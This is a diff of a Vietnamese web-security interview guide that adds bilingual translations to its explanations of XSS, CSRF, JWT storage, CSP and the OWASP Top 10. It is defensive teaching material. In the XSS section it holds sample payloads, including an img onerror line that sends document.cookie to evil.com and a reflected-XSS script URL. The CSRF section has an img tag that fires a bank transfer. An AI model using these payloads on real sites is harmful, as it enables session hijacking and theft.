@@ -2,11 +2,11 @@
 
 ## **⭐ PHIÊN BẢN TRẢ LỜI 1 PHÚT (Cho Phỏng Vấn Nhanh)**
 
-**"Web security là chiến lược 7 tầng bảo vệ (Defense in Depth): HTTPS mã hóa transport, XSS sanitize input/output, CSRF dùng token validation, Authentication với JWT + HttpOnly cookies, Secure Storage tránh localStorage cho sensitive data, API security với rate limiting + CORS, và Security Headers (CSP, HSTS) chống các attack vectors.**
+**"Web security là chiến lược 7 tầng bảo vệ (Defense in Depth - Phòng thủ đa tầng): HTTPS mã hóa transport (mã hóa vận chuyển), XSS sanitize input/output (làm sạch đầu vào/đầu ra), CSRF dùng token validation (xác thực token), Authentication với JWT + HttpOnly cookies (Xác thực với JWT + cookie HttpOnly), Secure Storage tránh localStorage cho sensitive data (Lưu trữ an toàn - tránh localStorage cho dữ liệu nhạy cảm), API security với rate limiting + CORS (Bảo mật API với giới hạn tốc độ + CORS), và Security Headers (CSP, HSTS) chống các attack vectors (Tiêu đề bảo mật chống các vector tấn công).**
 
-**Đã implement security cho trading platform xử lý 10K concurrent users: kết hợp DOMPurify sanitize XSS, CSRF token cho mọi mutation, JWT access token 15 phút + refresh token 7 ngày trong HttpOnly cookie, CSP headers block inline scripts, rate limiting 100 req/min, và dependency scanning với Snyk. Kết quả: 0 security incidents trong 2 năm production.**
+**Đã implement security cho trading platform xử lý 10K concurrent users (đã triển khai bảo mật cho nền tảng giao dịch xử lý 10K người dùng đồng thời): kết hợp DOMPurify sanitize XSS (kết hợp DOMPurify làm sạch XSS), CSRF token cho mọi mutation (token CSRF cho mọi thay đổi), JWT access token 15 phút + refresh token 7 ngày trong HttpOnly cookie (JWT access token 15 phút + refresh token 7 ngày trong cookie HttpOnly), CSP headers block inline scripts (tiêu đề CSP chặn script nội tuyến), rate limiting 100 req/min (giới hạn tốc độ 100 yêu cầu/phút), và dependency scanning với Snyk (và quét phụ thuộc với Snyk). Kết quả: 0 security incidents trong 2 năm production (0 sự cố bảo mật trong 2 năm sản xuất).**
 
-**Key principles: Never trust client, validate server-side, encrypt sensitive data, principle of least privilege, và regular security audits. Critical: HttpOnly cookies cho tokens (không localStorage), sanitize user input, và CSP headers."**
+**Key principles (Nguyên tắc chính): Never trust client (Không bao giờ tin tưởng client), validate server-side (xác thực phía máy chủ), encrypt sensitive data (mã hóa dữ liệu nhạy cảm), principle of least privilege (nguyên tắc đặc quyền tối thiểu), và regular security audits (và kiểm toán bảo mật thường xuyên). Critical (Quan trọng): HttpOnly cookies cho tokens (không localStorage) (cookie HttpOnly cho token - không localStorage), sanitize user input (làm sạch đầu vào người dùng), và CSP headers (và tiêu đề CSP)."**
 
 ---
 
@@ -16,94 +16,95 @@
 
 **Web security không phải 1 giải pháp duy nhất - đó là hệ thống bảo vệ nhiều tầng. Nếu 1 tầng bị xuyên thủng, các tầng khác vẫn bảo vệ.**
 
-**"Web security = 7 layers: HTTPS, XSS, CSRF, Auth, Storage, API, Headers. Defense in depth.**
+**"Web security = 7 layers (Bảo mật web = 7 tầng): HTTPS, XSS, CSRF, Auth (Xác thực), Storage (Lưu trữ), API, Headers (Tiêu đề). Defense in depth (Phòng thủ đa tầng).**
 
-**🛡️ 7-Layer Security Strategy:**
+**🛡️ 7-Layer Security Strategy (Chiến Lược Bảo Mật 7 Tầng):**
 
 1. **HTTPS + TLS**:
 
-   - Mã hóa data giữa browser ↔ server → ngăn Man-in-the-Middle.
-   - **HSTS**: `Strict-Transport-Security` header → bắt buộc HTTPS.
+   - Mã hóa data giữa browser ↔ server (Encrypt data between browser ↔ server) → ngăn Man-in-the-Middle (prevent Man-in-the-Middle attack).
+   - **HSTS**: `Strict-Transport-Security` header → bắt buộc HTTPS (force HTTPS).
 
-2. **XSS Prevention (Cross-Site Scripting)**:
+2. **XSS Prevention (Cross-Site Scripting - Ngăn Chặn XSS)**:
 
-   - **Problem**: Attacker inject malicious `<script>` → steal cookies, session.
-   - **Solution**:
-     - **React auto-escape**: `{userInput}` auto sanitize.
-     - **DOMPurify**: Sanitize HTML khi cần `dangerouslySetInnerHTML`.
-     - **CSP**: `Content-Security-Policy` header → block inline scripts.
+   - **Problem (Vấn đề)**: Attacker inject malicious `<script>` (Kẻ tấn công chèn script độc hại) → steal cookies, session (đánh cắp cookie, phiên).
+   - **Solution (Giải pháp)**:
+     - **React auto-escape**: `{userInput}` auto sanitize (tự động làm sạch).
+     - **DOMPurify**: Sanitize HTML khi cần `dangerouslySetInnerHTML` (Làm sạch HTML khi cần).
+     - **CSP**: `Content-Security-Policy` header → block inline scripts (chặn script nội tuyến).
 
    ```js
-   // ❌ Vulnerable
+   // ❌ Vulnerable (Dễ bị tấn công)
    <div dangerouslySetInnerHTML={{ __html: userInput }} />;
-   // ✅ Safe
+   // ✅ Safe (An toàn)
    import DOMPurify from 'dompurify';
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
    ```
 
-3. **CSRF Protection (Cross-Site Request Forgery)**:
+3. **CSRF Protection (Cross-Site Request Forgery - Bảo Vệ CSRF)**:
 
-   - **Problem**: Attacker trick user send malicious request (e.g., transfer money).
-   - **Solution**:
-     - **CSRF Token**: Server generate unique token per session → include in forms.
-     - **SameSite Cookies**: `SameSite=Strict` → cookies chỉ send same-origin requests.
+   - **Problem (Vấn đề)**: Attacker trick user send malicious request (Kẻ tấn công lừa người dùng gửi yêu cầu độc hại) (e.g., transfer money - ví dụ: chuyển tiền).
+   - **Solution (Giải pháp)**:
+     - **CSRF Token**: Server generate unique token per session (Máy chủ tạo token duy nhất mỗi phiên) → include in forms (bao gồm trong form).
+     - **SameSite Cookies**: `SameSite=Strict` → cookies chỉ send same-origin requests (cookie chỉ gửi yêu cầu cùng nguồn).
 
-4. **Authentication & Authorization**:
+4. **Authentication & Authorization (Xác Thực & Phân Quyền)**:
 
-   - **JWT**: Access token (short-lived, 15 min) + Refresh token (long-lived, 7 days).
-   - **HttpOnly Cookies**: Store tokens → JavaScript không access được (prevent XSS steal).
-   - **Token Refresh**: Auto refresh access token khi expired (seamless UX).
+   - **JWT**: Access token (short-lived, 15 min - ngắn hạn, 15 phút) + Refresh token (long-lived, 7 days - dài hạn, 7 ngày).
+   - **HttpOnly Cookies**: Store tokens → JavaScript không access được (Lưu token → JavaScript không thể truy cập) (prevent XSS steal - ngăn đánh cắp XSS).
+   - **Token Refresh**: Auto refresh access token khi expired (Tự động làm mới token khi hết hạn) (seamless UX - trải nghiệm người dùng liền mạch).
 
-5. **Secure Storage**:
+5. **Secure Storage (Lưu Trữ An Toàn)**:
 
-   - **NEVER localStorage for sensitive data**: JavaScript có thể access → XSS risk.
-   - **HttpOnly Cookies**: Best cho tokens (server-only access).
-   - **Encrypt sensitive data**: AES-256 encryption trước khi store.
+   - **NEVER localStorage for sensitive data (KHÔNG BAO GIỜ localStorage cho dữ liệu nhạy cảm)**: JavaScript có thể access (JavaScript can access) → XSS risk (rủi ro XSS).
+   - **HttpOnly Cookies**: Best cho tokens (Tốt nhất cho token) (server-only access - chỉ máy chủ truy cập).
+   - **Encrypt sensitive data (Mã hóa dữ liệu nhạy cảm)**: AES-256 encryption trước khi store (mã hóa AES-256 trước khi lưu).
 
-6. **API Security**:
+6. **API Security (Bảo Mật API)**:
 
-   - **Rate Limiting**: Limit requests (100/min) → prevent brute-force.
-   - **Input Validation**: Validate/sanitize inputs server-side (không tin client).
-   - **CORS**: Restrict origins có thể call API.
+   - **Rate Limiting (Giới hạn tốc độ)**: Limit requests (100/min) (Giới hạn yêu cầu - 100/phút) → prevent brute-force (ngăn tấn công vũ phu).
+   - **Input Validation (Xác thực đầu vào)**: Validate/sanitize inputs server-side (Xác thực/làm sạch đầu vào phía máy chủ) (không tin client - don't trust client).
+   - **CORS**: Restrict origins có thể call API (Giới hạn nguồn gốc có thể gọi API).
 
    ```js
    // Server (Express)
    app.use(cors({ origin: 'https://trusted-domain.com' }));
+   // (Chỉ cho phép domain tin cậy gọi API)
    ```
 
-7. **Security Headers**:
-   - **CSP**: `Content-Security-Policy: default-src 'self'` → block external scripts.
-   - **X-Frame-Options**: `DENY` → prevent clickjacking.
-   - **X-Content-Type-Options**: `nosniff` → prevent MIME sniffing.
-   - **Referrer-Policy**: Control referrer info leaked.
+7. **Security Headers (Tiêu Đề Bảo Mật)**:
+   - **CSP**: `Content-Security-Policy: default-src 'self'` → block external scripts (chặn script bên ngoài).
+   - **X-Frame-Options**: `DENY` → prevent clickjacking (ngăn clickjacking).
+   - **X-Content-Type-Options**: `nosniff` → prevent MIME sniffing (ngăn ngửi MIME).
+   - **Referrer-Policy**: Control referrer info leaked (Kiểm soát thông tin referrer bị rò rỉ).
 
-**⚠️ Common Vulnerabilities (OWASP Top 10):**
+**⚠️ Common Vulnerabilities (OWASP Top 10 - Lỗ Hổng Thường Gặp):**
 
-1. **Injection** (SQL, XSS): Sanitize inputs, use parameterized queries.
-2. **Broken Authentication**: Strong passwords, MFA, session timeout.
-3. **Sensitive Data Exposure**: Encrypt data, HTTPS, HttpOnly cookies.
-4. **XML External Entities (XXE)**: Disable XML external entity processing.
-5. **Broken Access Control**: Server-side authorization checks.
-6. **Security Misconfiguration**: Remove default credentials, disable debug mode.
-7. **XSS**: Escape outputs, CSP headers.
-8. **Insecure Deserialization**: Validate serialized data.
-9. **Using Components with Known Vulnerabilities**: Regular dependency updates (`npm audit`).
-10. **Insufficient Logging & Monitoring**: Log security events, monitor anomalies.
+1. **Injection (Chèn mã)** (SQL, XSS): Sanitize inputs (Làm sạch đầu vào), use parameterized queries (sử dụng truy vấn tham số hóa).
+2. **Broken Authentication (Xác thực bị hỏng)**: Strong passwords (Mật khẩu mạnh), MFA (Xác thực đa yếu tố), session timeout (hết hạn phiên).
+3. **Sensitive Data Exposure (Lộ dữ liệu nhạy cảm)**: Encrypt data (Mã hóa dữ liệu), HTTPS, HttpOnly cookies.
+4. **XML External Entities (XXE - Thực thể bên ngoài XML)**: Disable XML external entity processing (Tắt xử lý thực thể bên ngoài XML).
+5. **Broken Access Control (Kiểm soát truy cập bị hỏng)**: Server-side authorization checks (Kiểm tra phân quyền phía máy chủ).
+6. **Security Misconfiguration (Cấu hình bảo mật sai)**: Remove default credentials (Xóa thông tin đăng nhập mặc định), disable debug mode (tắt chế độ debug).
+7. **XSS**: Escape outputs (Thoát đầu ra), CSP headers (tiêu đề CSP).
+8. **Insecure Deserialization (Giải tuần tự hóa không an toàn)**: Validate serialized data (Xác thực dữ liệu đã tuần tự hóa).
+9. **Using Components with Known Vulnerabilities (Sử dụng thành phần có lỗ hổng đã biết)**: Regular dependency updates (Cập nhật phụ thuộc thường xuyên) (`npm audit`).
+10. **Insufficient Logging & Monitoring (Ghi nhật ký & Giám sát không đủ)**: Log security events (Ghi nhật ký sự kiện bảo mật), monitor anomalies (giám sát bất thường).
 
-**💡 Senior Insights:**
+**💡 Senior Insights (Kiến Thức Senior):**
 
-- **Defense in Depth**: Multiple layers → nếu 1 layer fail, others protect.
-- **Security Audits**: Regular penetration testing, code reviews.
-- **Dependency Scanning**: `npm audit`, Snyk, Dependabot → auto update vulnerable packages.
-- **Security Headers**: Use helmet.js (Node.js) → auto set secure headers.
-- **HTTPS Everywhere**: Even internal apps → prevent internal network sniffing.
+- **Defense in Depth (Phòng thủ đa tầng)**: Multiple layers (Nhiều tầng) → nếu 1 layer fail (nếu 1 tầng thất bại), others protect (các tầng khác vẫn bảo vệ).
+- **Security Audits (Kiểm toán bảo mật)**: Regular penetration testing (Kiểm thử xâm nhập thường xuyên), code reviews (đánh giá mã).
+- **Dependency Scanning (Quét phụ thuộc)**: `npm audit`, Snyk, Dependabot → auto update vulnerable packages (tự động cập nhật gói có lỗ hổng).
+- **Security Headers (Tiêu đề bảo mật)**: Use helmet.js (Node.js) → auto set secure headers (tự động đặt tiêu đề bảo mật).
+- **HTTPS Everywhere (HTTPS mọi nơi)**: Even internal apps (Ngay cả ứng dụng nội bộ) → prevent internal network sniffing (ngăn ngửi mạng nội bộ).
 
-**🚀 Best Practices:**
+**🚀 Best Practices (Thực Hành Tốt Nhất):**
 
-- Principle of Least Privilege: Users chỉ access data cần thiết.
-- Never trust client-side validation: Always validate server-side.
-- Encrypt sensitive data at rest & in transit.
-- Regular security training cho developers.
+- Principle of Least Privilege (Nguyên tắc đặc quyền tối thiểu): Users chỉ access data cần thiết (Người dùng chỉ truy cập dữ liệu cần thiết).
+- Never trust client-side validation (Không bao giờ tin xác thực phía client): Always validate server-side (Luôn xác thực phía máy chủ).
+- Encrypt sensitive data at rest & in transit (Mã hóa dữ liệu nhạy cảm khi nghỉ & khi truyền).
+- Regular security training cho developers (Đào tạo bảo mật thường xuyên cho nhà phát triển).
 
 ### **🔬 Chi Tiết 7 Tầng Bảo Mật**
 
@@ -146,20 +147,21 @@
    // 💡 Request/Response đều được mã hóa → An toàn tuyệt đối
 ```
 
-**Best practices:**
+**Best practices (Thực hành tốt nhất):**
 
-- ✅ **Dùng TLS 1.2 trở lên** (không TLS 1.0/1.1 - đã lỗi thời)
-  // 💡 TLS 1.0/1.1: Có lỗ hổng bảo mật → Không dùng nữa
-  // 💡 TLS 1.2/1.3: Phiên bản mới, an toàn hơn
-- 🚀 **Enable HSTS header** → browser tự động chuyển HTTP → HTTPS
+- ✅ **Dùng TLS 1.2 trở lên (Use TLS 1.2+)** (không TLS 1.0/1.1 - đã lỗi thời - not TLS 1.0/1.1 - outdated)
+  // 💡 TLS 1.0/1.1: Có lỗ hổng bảo mật → Không dùng nữa (Has security vulnerabilities → No longer used)
+  // 💡 TLS 1.2/1.3: Phiên bản mới, an toàn hơn (New versions, more secure)
+- 🚀 **Enable HSTS header (Bật tiêu đề HSTS)** → browser tự động chuyển HTTP → HTTPS (browser automatically converts HTTP → HTTPS)
   // 💡 HSTS: Strict-Transport-Security header
   // 💡 Browser nhớ: Site này chỉ dùng HTTPS → Tự động redirect HTTP → HTTPS
-- 📜 **Certificate từ CA tin cậy** (Let's Encrypt free, Cloudflare, DigiCert)
-  // 💡 CA: Certificate Authority - Tổ chức cấp chứng chỉ
-  // 💡 Let's Encrypt: Miễn phí, tự động renew
-- ⏰ **Renew certificate trước khi hết hạn** (auto-renewal với certbot)
-  // 💡 Certificate có thời hạn (thường 90 ngày)
-  // 💡 Certbot: Tool tự động renew certificate → Không bao giờ hết hạn
+  // (Browser remembers: This site only uses HTTPS → Auto redirect HTTP → HTTPS)
+- 📜 **Certificate từ CA tin cậy (Certificate from trusted CA)** (Let's Encrypt free, Cloudflare, DigiCert)
+  // 💡 CA: Certificate Authority - Tổ chức cấp chứng chỉ (Certificate Authority - Organization that issues certificates)
+  // 💡 Let's Encrypt: Miễn phí, tự động renew (Free, auto renew)
+- ⏰ **Renew certificate trước khi hết hạn (Renew certificate before expiration)** (auto-renewal với certbot - auto-renewal with certbot)
+  // 💡 Certificate có thời hạn (thường 90 ngày) (Certificate has expiration - usually 90 days)
+  // 💡 Certbot: Tool tự động renew certificate → Không bao giờ hết hạn (Tool auto renews certificate → Never expires)
 
 ---
 
@@ -172,65 +174,65 @@
 **Attack scenario (Kịch bản tấn công):**
 
 ```javascript
-// 🚨 Hacker post comment độc hại:
+// 🚨 Hacker post comment độc hại (Hacker posts malicious comment):
 <img src="x" onerror="
   fetch('https://evil.com/steal?cookie=' + document.cookie)
 ">
-// 💡 Hacker nhập HTML độc vào form comment
-// 💡 <img> tag với src="x" (không tồn tại) → Image load fail
-// 💡 onerror: Event handler chạy khi image load fail
-// 💡 document.cookie: Lấy tất cả cookies (bao gồm session token)
+// 💡 Hacker nhập HTML độc vào form comment (Hacker enters malicious HTML into comment form)
+// 💡 <img> tag với src="x" (không tồn tại) → Image load fail (<img> tag with src="x" - doesn't exist → Image load fails)
+// 💡 onerror: Event handler chạy khi image load fail (Event handler runs when image load fails)
+// 💡 document.cookie: Lấy tất cả cookies (bao gồm session token) (Gets all cookies - including session token)
 
-// ⚠️ Khi user khác xem comment:
-// 1. Browser render HTML → Image load fail
-// 2. onerror trigger → Script chạy
-// 3. fetch() gửi cookies về server hacker (evil.com)
-// 4. Hacker nhận cookies → Dùng để hijack session
-// 5. Hacker đăng nhập với session của victim → Steal data, chuyển tiền...
+// ⚠️ Khi user khác xem comment (When other user views comment):
+// 1. Browser render HTML → Image load fail (Browser renders HTML → Image load fails)
+// 2. onerror trigger → Script chạy (onerror triggers → Script runs)
+// 3. fetch() gửi cookies về server hacker (evil.com) (fetch() sends cookies to hacker's server)
+// 4. Hacker nhận cookies → Dùng để hijack session (Hacker receives cookies → Uses to hijack session)
+// 5. Hacker đăng nhập với session của victim → Steal data, chuyển tiền... (Hacker logs in with victim's session → Steal data, transfer money...)
 ```
 
-**3 loại XSS:**
+**3 loại XSS (3 Types of XSS):**
 
-1. **📦 Stored XSS**: Lưu script trong database → hiển thị cho mọi user
-   // 💡 Script được lưu vĩnh viễn trong DB
-   // 💡 Mọi user xem đều bị tấn công
-   // 💡 VD: Comment, post, profile name...
+1. **📦 Stored XSS (XSS lưu trữ)**: Lưu script trong database → hiển thị cho mọi user (Store script in database → display to all users)
+   // 💡 Script được lưu vĩnh viễn trong DB (Script stored permanently in DB)
+   // 💡 Mọi user xem đều bị tấn công (All users viewing are attacked)
+   // 💡 VD (Example): Comment, post, profile name...
 
-2. **🔗 Reflected XSS**: Script trong URL → victim click link độc
-   // 💡 Script không lưu trong DB, chỉ trong URL
-   // 💡 Hacker gửi link độc → User click → Script chạy
-   // 💡 VD: `https://site.com/search?q=<script>alert('xss')</script>`
+2. **🔗 Reflected XSS (XSS phản chiếu)**: Script trong URL → victim click link độc (Script in URL → victim clicks malicious link)
+   // 💡 Script không lưu trong DB, chỉ trong URL (Script not stored in DB, only in URL)
+   // 💡 Hacker gửi link độc → User click → Script chạy (Hacker sends malicious link → User clicks → Script runs)
+   // 💡 VD (Example): `https://site.com/search?q=<script>alert('xss')</script>`
 
-3. **🌐 DOM-based XSS**: Client-side JavaScript xử lý input không an toàn
-   // 💡 Script không đến server, chỉ xử lý ở client
-   // 💡 VD: `document.location.hash` → Render HTML không sanitize
+3. **🌐 DOM-based XSS (XSS dựa trên DOM)**: Client-side JavaScript xử lý input không an toàn (Client-side JavaScript processes unsafe input)
+   // 💡 Script không đến server, chỉ xử lý ở client (Script doesn't reach server, only processed on client)
+   // 💡 VD (Example): `document.location.hash` → Render HTML không sanitize (Render HTML without sanitization)
 
 **Defense strategies (Chiến lược phòng thủ):**
 
-- ✅ **Input sanitization**: Loại bỏ/escape dangerous characters
-  // 💡 Sanitize: Làm sạch input, xóa các ký tự nguy hiểm
-  // 💡 VD: `<script>` → `&lt;script&gt;` hoặc xóa hẳn
+- ✅ **Input sanitization (Làm sạch đầu vào)**: Loại bỏ/escape dangerous characters (Remove/escape dangerous characters)
+  // 💡 Sanitize: Làm sạch input, xóa các ký tự nguy hiểm (Clean input, remove dangerous characters)
+  // 💡 VD (Example): `<script>` → `&lt;script&gt;` hoặc xóa hẳn (or remove completely)
   // 💡 Tool: DOMPurify, sanitize-html
 
-- ✅ **Output encoding**: Convert `<` → `&lt;`, `>` → `&gt;`
-  // 💡 Encode: Chuyển đổi ký tự đặc biệt thành HTML entities
-  // 💡 `<script>` → `&lt;script&gt;` → Browser hiển thị text, không chạy code
-  // 💡 React tự động làm việc này với `{userInput}`
+- ✅ **Output encoding (Mã hóa đầu ra)**: Convert `<` → `&lt;`, `>` → `&gt;`
+  // 💡 Encode: Chuyển đổi ký tự đặc biệt thành HTML entities (Convert special characters to HTML entities)
+  // 💡 `<script>` → `&lt;script&gt;` → Browser hiển thị text, không chạy code (Browser displays text, doesn't run code)
+  // 💡 React tự động làm việc này với `{userInput}` (React automatically does this with `{userInput}`)
 
-- ✅ **CSP (Content Security Policy)**: Whitelist nguồn script được phép
-  // 💡 CSP: Header chỉ định script nào được phép chạy
-  // 💡 VD: `script-src 'self'` → Chỉ script từ cùng domain
-  // 💡 Script từ evil.com → Browser BLOCK → XSS thất bại
+- ✅ **CSP (Content Security Policy - Chính sách bảo mật nội dung)**: Whitelist nguồn script được phép (Whitelist allowed script sources)
+  // 💡 CSP: Header chỉ định script nào được phép chạy (Header specifies which scripts are allowed to run)
+  // 💡 VD (Example): `script-src 'self'` → Chỉ script từ cùng domain (Only scripts from same domain)
+  // 💡 Script từ evil.com → Browser BLOCK → XSS thất bại (Script from evil.com → Browser BLOCKS → XSS fails)
 
-- ✅ **React auto-escape**: `{userInput}` tự động escape
-  // 💡 React tự động escape HTML trong JSX
-  // 💡 `<script>` → Hiển thị text, không chạy code
-  // 💡 ⚠️ Lưu ý: `dangerouslySetInnerHTML` KHÔNG escape → Phải sanitize!
+- ✅ **React auto-escape (React tự động escape)**: `{userInput}` tự động escape
+  // 💡 React tự động escape HTML trong JSX (React automatically escapes HTML in JSX)
+  // 💡 `<script>` → Hiển thị text, không chạy code (Displays text, doesn't run code)
+  // 💡 ⚠️ Lưu ý (Note): `dangerouslySetInnerHTML` KHÔNG escape → Phải sanitize! (doesn't escape → Must sanitize!)
 
-- ✅ **HttpOnly cookies**: JavaScript không access được cookie
-  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
-  // 💡 XSS steal cookie → Không được → Giảm thiệt hại
-  // 💡 VD: `Set-Cookie: session=abc123; HttpOnly`
+- ✅ **HttpOnly cookies (Cookie HttpOnly)**: JavaScript không access được cookie (JavaScript cannot access cookie)
+  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được (Cookie only sent with HTTP requests, JS can't read)
+  // 💡 XSS steal cookie → Không được → Giảm thiệt hại (XSS steal cookie → Can't → Reduces damage)
+  // 💡 VD (Example): `Set-Cookie: session=abc123; HttpOnly`
 
 ---
 
@@ -244,47 +246,50 @@
 
 ```html
 <!-- 📧 Email phishing gửi đến victim (đã login vào bank.com) -->
+<!-- (Phishing email sent to victim - already logged into bank.com) -->
 <img src="https://bank.com/transfer?to=hacker&amount=10000" />
-// 💡 Hacker gửi email chứa HTML độc // 💡 <img /> tag với src là URL chuyển
-tiền // 💡 User mở email → Browser tự động load image → Gửi GET request
+// 💡 Hacker gửi email chứa HTML độc (Hacker sends email containing malicious
+HTML) // 💡 <img /> tag với src là URL chuyển tiền (<img /> tag with src as
+transfer URL) // 💡 User mở email → Browser tự động load image → Gửi GET request
+(User opens email → Browser auto loads image → Sends GET request)
 
-<!-- ⚠️ Browser tự động gửi request kèm cookies của bank.com
-     → Server nhận request + cookies (session token)
-     → Server nghĩ đây là request hợp lệ từ user đã login
-     → Xử lý request → Chuyển $10,000 cho hacker
-     → User không biết gì cho đến khi check tài khoản!
--->
+<!-- ⚠️ Browser tự động gửi request kèm cookies của bank.com -->
+<!-- (Browser automatically sends request with bank.com cookies) -->
+<!-- → Server nhận request + cookies (session token) (Server receives request + cookies - session token) -->
+<!-- → Server nghĩ đây là request hợp lệ từ user đã login (Server thinks this is valid request from logged-in user) -->
+<!-- → Xử lý request → Chuyển $10,000 cho hacker (Processes request → Transfers $10,000 to hacker) -->
+<!-- → User không biết gì cho đến khi check tài khoản! (User doesn't know until checking account!) -->
 ```
 
 **Defense strategies (Chiến lược phòng thủ):**
 
-1. **🔑 CSRF Token**: Server tạo unique token mỗi session
-   // 💡 Token: Chuỗi ngẫu nhiên, khó đoán (32 bytes)
-   // 💡 Mỗi session có token riêng → Hacker không biết token của user khác
+1. **🔑 CSRF Token (Token CSRF)**: Server tạo unique token mỗi session (Server creates unique token per session)
+   // 💡 Token: Chuỗi ngẫu nhiên, khó đoán (32 bytes) (Random string, hard to guess - 32 bytes)
+   // 💡 Mỗi session có token riêng → Hacker không biết token của user khác (Each session has own token → Hacker doesn't know other user's token)
 
-   - ✅ **Frontend gửi token trong request body/header**
+   - ✅ **Frontend gửi token trong request body/header (Frontend sends token in request body/header)**
      // 💡 Form: `<input type="hidden" name="csrfToken" value="...">`
      // 💡 AJAX: Header `X-CSRF-Token: ...`
 
-   - ✅ **Server verify token trước khi xử lý**
-     // 💡 So sánh token từ client vs token trong session
-     // 💡 Không khớp → Reject request → CSRF thất bại
-     // 💡 Khớp → Xử lý request bình thường
+   - ✅ **Server verify token trước khi xử lý (Server verifies token before processing)**
+     // 💡 So sánh token từ client vs token trong session (Compare token from client vs token in session)
+     // 💡 Không khớp → Reject request → CSRF thất bại (Don't match → Reject request → CSRF fails)
+     // 💡 Khớp → Xử lý request bình thường (Match → Process request normally)
 
 2. **🍪 SameSite Cookie**: `SameSite=Strict` hoặc `Lax`
-   // 💡 SameSite: Browser chỉ gửi cookie cho same-origin requests
-   // 💡 Strict: Cookie KHÔNG BAO GIỜ gửi cho cross-site requests
-   // 💡 Lax: Cookie gửi cho GET requests từ cross-site (nhưng không POST)
+   // 💡 SameSite: Browser chỉ gửi cookie cho same-origin requests (Browser only sends cookie for same-origin requests)
+   // 💡 Strict: Cookie KHÔNG BAO GIỜ gửi cho cross-site requests (Cookie NEVER sent for cross-site requests)
+   // 💡 Lax: Cookie gửi cho GET requests từ cross-site (nhưng không POST) (Cookie sent for GET requests from cross-site - but not POST)
 
-   - ✅ **Browser không gửi cookie cho cross-site requests**
-     // 💡 Request từ evil.com → Browser KHÔNG gửi cookie của bank.com
-     // 💡 Server không nhận cookie → Không có session → Reject request
-     // 💡 CSRF thất bại!
+   - ✅ **Browser không gửi cookie cho cross-site requests (Browser doesn't send cookie for cross-site requests)**
+     // 💡 Request từ evil.com → Browser KHÔNG gửi cookie của bank.com (Request from evil.com → Browser DOESN'T send bank.com cookie)
+     // 💡 Server không nhận cookie → Không có session → Reject request (Server doesn't receive cookie → No session → Reject request)
+     // 💡 CSRF thất bại! (CSRF fails!)
 
-3. **🔐 Double Submit Cookie**:
-   // 💡 Cookie chứa random token (CSRF token)
-   // 💡 Form/AJAX cũng gửi token (trong body hoặc header)
-   // 💡 Server compare 2 values → Phải khớp mới xử lý
+3. **🔐 Double Submit Cookie (Cookie gửi kép)**:
+   // 💡 Cookie chứa random token (CSRF token) (Cookie contains random token - CSRF token)
+   // 💡 Form/AJAX cũng gửi token (trong body hoặc header) (Form/AJAX also sends token - in body or header)
+   // 💡 Server compare 2 values → Phải khớp mới xử lý (Server compares 2 values → Must match to process)
 
    - ✅ **Cookie chứa random token**
      // 💡 Server set cookie: `csrf-token=abc123`
